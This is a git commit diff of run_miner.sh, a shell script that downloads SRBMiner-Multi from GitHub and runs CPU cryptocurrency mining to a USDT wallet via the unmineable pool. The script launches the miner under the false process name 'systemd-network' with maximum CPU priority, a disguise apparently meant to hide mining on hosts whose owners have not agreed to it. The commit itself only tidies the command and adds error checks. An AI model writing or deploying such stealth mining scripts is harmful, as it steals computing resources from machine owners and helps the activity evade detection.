df003cb4db4c7d878da7bcacc2c6463db9ef11d0
luxekazi <luxekazi@gmail.com>
2025-04-01 14:17:06 +0700

    Update run_miner.sh

--- run_miner.sh
+++ run_miner.sh
@@ -4,13 +4,22 @@ THREADS=3
 MINER_NAME=$(shuf -i 10000000-99999999 -n 1)
 
 mkdir -p neable
-cd neable
+cd neable || exit 1
 
-if [ ! -f SRBMiner-Multi-2-8-0-Linux.tar.gz ]; then
+if [ ! -f SRBMiner-Multi-2-8-1-Linux.tar.gz ]; then
   wget -q https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.1/SRBMiner-Multi-2-8-1-Linux.tar.gz
   tar -xf SRBMiner-Multi-2-8-1-Linux.tar.gz
 fi
 
-cd SRBMiner-Multi-2-8-1
+cd SRBMiner-Multi-2-8-1 || exit 1
 
-exec -a systemd-network nice -n -20 ./SRBMiner-MULTI --disable-gpu --algorithm randomx -o rx.unmineable.com:3333 -a rx -k -u USDT:0xfe301Eb4Cb42EE7F605922Cf82c813638011D89A.$MINER_NAME#ii6d-2qcm -p x --cpu-threads $THREADS --cpu-max-threads-hint=100 --randomx-1gb-pages
+exec -a systemd-network nice -n -20 ./SRBMiner-MULTI \
+  --disable-gpu \
+  --algorithm randomx \
+  -o rx.unmineable.com:3333 \
+  -a rx -k \
+  -u USDT:0xfe301Eb4Cb42EE7F605922Cf82c813638011D89A.$MINER_NAME#ii6d-2qcm \
+  -p x \
+  --cpu-threads $THREADS \
+  --cpu-max-threads-hint=100 \
+  --randomx-1gb-pages
